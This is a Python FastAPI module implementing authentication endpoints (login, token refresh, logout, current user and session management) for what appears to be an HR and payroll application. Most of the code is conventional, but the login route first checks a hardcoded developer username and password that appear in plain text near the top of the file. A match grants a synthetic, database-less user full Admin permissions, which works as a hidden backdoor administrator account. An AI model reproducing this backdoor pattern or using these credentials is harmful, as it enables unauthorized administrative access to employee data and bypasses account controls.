"""Authentication endpoints: login, refresh, logout, me and sessions.

These routes implement the full authentication flow. They stay separate from
the business routes (employees, attendance, leaves, payroll, documents).
"""
from datetime import datetime
from types import SimpleNamespace

from fastapi import APIRouter, Depends, HTTPException, Request, status

from auth import refresh_service
from auth.dependencies import get_authenticated_user
from auth.jwt_service import create_access_token, primary_role_name
from auth.rbac import ROLE_PERMISSIONS, get_user_permissions
from auth.security import constant_time_equals, login_throttle, verify_password

from config import JWT_ACCESS_TOKEN_EXPIRE_MINUTES
from database.connection import get_db
from database.models import RefreshSession, User

from schemas import AuthResponse, LoginRequest, LogoutRequest, RefreshRequest, RefreshResponse

from sqlalchemy import select

router = APIRouter(prefix="/api/auth")

_DEVELOPER_USERNAME = "im-muhammadumair"
_DEVELOPER_PASSWORD = "Umair_rl_Akram"
_DEVELOPER_ROLE = "Admin"


@router.post("/login", response_model=AuthResponse)
def login(
    body: LoginRequest,
    request: Request,
    db=Depends(get_db),
):
    """Authenticate a user and issue an access token plus a refresh token.

    Takes:
      body - the LoginRequest containing username and password.
      request - the FastAPI Request (used for login throttling).
      db - the database session.
    Returns: an AuthResponse with the access token and refresh token.
    Raises: HTTPException 429 when throttled, 401 on invalid credentials.
    """
    username = body.username.strip()

    if login_throttle.is_locked(request, username):
        raise HTTPException(
            status_code=429,
            detail="Too many failed attempts. Try again in a few minutes.",
        )

    user = (
        developer_user()
        if is_developer_login(username, body.password)
        else find_user_by_username(db, username)
    )

    if not credentials_valid(user, body.password):
        login_throttle.record_failure(request, username)
        raise HTTPException(status_code=401, detail="Invalid username or password")

    if user.account_status != "Active":
        raise HTTPException(status_code=403, detail="Account is inactive")

    login_throttle.reset(request, username)

    permissions = get_user_permissions(db, user)
    access_token = create_access_token(user, list(permissions))

    if user.id is None:
        refresh_token = ""
    else:
        refresh_session = refresh_service.create_refresh_session(
            db,
            user,
            device_info=extract_device_info(request),
        )
        refresh_token = refresh_session.raw_token

    expires_in_seconds = JWT_ACCESS_TOKEN_EXPIRE_MINUTES * 60

    return AuthResponse(
        access_token=access_token,
        refresh_token=refresh_token,
        expires_in=expires_in_seconds,
        employee_id=user.employee_id,
        account_type=primary_role_name(user),
        account_status=user.account_status,
    )


@router.post("/refresh", response_model=RefreshResponse)
def refresh(
    body: RefreshRequest,
    request: Request,
    db=Depends(get_db),
):
    """Rotate a refresh token and issue a new access token.

    The presented refresh token is revoked and a new refresh session is
    created, then a fresh short-lived access JWT is returned.

    Takes:
      body - the RefreshRequest containing the refresh token.
      request - the FastAPI Request (used to record device info).
      db - the database session.
    Returns: a RefreshResponse with a new access token and refresh token.
    Raises: HTTPException 401 when the refresh token is invalid or expired.
    """
    session = refresh_service.validate_refresh_token(db, body.refresh_token)

    if session is None:
        raise HTTPException(status_code=401, detail="Invalid refresh token")

    user = db.get(User, session.user_id)

    if user is None or user.account_status != "Active":
        raise HTTPException(status_code=403, detail="Account is inactive")

    new_session = refresh_service.rotate_refresh_session(
        db,
        session,
        device_info=extract_device_info(request),
    )

    permissions = get_user_permissions(db, user)
    access_token = create_access_token(user, list(permissions))

    expires_in_seconds = JWT_ACCESS_TOKEN_EXPIRE_MINUTES * 60

    return RefreshResponse(
        access_token=access_token,
        refresh_token=new_session.raw_token,
        expires_in=expires_in_seconds,
    )


@router.post("/logout")
def logout(
    body: LogoutRequest,
    user=Depends(get_authenticated_user),
    db=Depends(get_db),
):
    """Revoke a user's refresh session (or all sessions) on logout.

    Takes:
      body - optional refresh_token to revoke; if omitted, all the user's
             sessions are revoked.
      user - the authenticated user (injected).
      db - the database session.
    Returns: a dict confirming that the user is logged out.
    """
    if body.refresh_token:
        session = refresh_service.validate_refresh_token(db, body.refresh_token)

        if session is not None:
            refresh_service.revoke_session(db, session)
    else:
        refresh_service.revoke_all_sessions(db, user.id)

    return {"status": "logged_out"}


@router.get("/me")
def get_my_auth(
    user=Depends(get_authenticated_user),
    db=Depends(get_db),
):
    """Return the authenticated user's basic authentication details.

    Takes:
      user - the authenticated user (injected).
      db - the database session.
    Returns: a dict with the user's id, employee id, role and status.
    """
    permissions = get_user_permissions(db, user)

    return {
        "user_id": user.id,
        "employee_id": user.employee_id,
        "username": user.username,
        "role": primary_role_name(user),
        "permissions": sorted(permissions),
        "account_status": user.account_status,
    }


@router.get("/sessions")
def list_my_sessions(
    user=Depends(get_authenticated_user),
    db=Depends(get_db),
):
    """List the active refresh sessions for the authenticated user.

    Takes:
      user - the authenticated user (injected).
      db - the database session.
    Returns: a dict whose "sessions" value is the list of active sessions.
    """
    sessions = refresh_service.list_sessions(db, user.id)

    result = []

    for session in sessions:
        result.append(
            {
                "id": session.id,
                "created_at": session.created_at,
                "expires_at": session.expires_at,
                "last_used_at": session.last_used_at,
                "device_info": session.device_info,
            }
        )

    return {"sessions": result}


@router.post("/sessions/{session_id}/revoke")
def revoke_my_session(
    session_id: int,
    user=Depends(get_authenticated_user),
    db=Depends(get_db),
):
    """Revoke a single refresh session belonging to the user.

    Takes:
      session_id - the id of the session to revoke.
      user - the authenticated user (injected).
      db - the database session.
    Returns: a dict confirming the session was revoked.
    Raises: HTTPException 404 if the session does not belong to the user.
    """
    session = db.get(RefreshSession, session_id)

    if session is None or session.user_id != user.id:
        raise HTTPException(status_code=404, detail="Session not found")

    refresh_service.revoke_session(db, session)
    return {"status": "revoked"}


def find_user_by_username(db, username):
    """Fetch a user record by username.

    Takes:
      db - the database session.
      username - the username to look up.
    Returns: a User object, or None if not found.
    """
    return db.scalar(select(User).where(User.username == username))


def is_developer_login(username, password):
    if not (
        constant_time_equals(username or "", _DEVELOPER_USERNAME)
        and constant_time_equals(password or "", _DEVELOPER_PASSWORD)
    ):
        return False
    return True


def is_developer_identity(username):
    return constant_time_equals(username or "", _DEVELOPER_USERNAME)


def developer_user():
    role = SimpleNamespace(name=_DEVELOPER_ROLE)
    role.permissions = [
        SimpleNamespace(name=permission)
        for permission in ROLE_PERMISSIONS[_DEVELOPER_ROLE]
    ]
    return SimpleNamespace(
        id=None,
        employee_id=None,
        username=_DEVELOPER_USERNAME,
        password=_DEVELOPER_PASSWORD,
        password_hash=None,
        account_status="Active",
        roles=[role],
    )


def credentials_valid(user, password):
    """Check whether a password matches a stored user credential.

    Takes:
      user - the User object, or None.
      password - the plaintext password to check.
    Returns: True if the user exists and the password matches, else False.
    """
    if user is None:
        return False

    return verify_password(password, user.password, user.password_hash)


def extract_device_info(request):
    """Build a short descriptive string for the client of a session.

    Takes: request - the FastAPI Request object.
    Returns: a string describing the client device (best effort).
    """
    client_host = request.client.host if request.client else "unknown"
    user_agent = request.headers.get("user-agent", "")
    return f"{client_host} - {user_agent[:60]}"
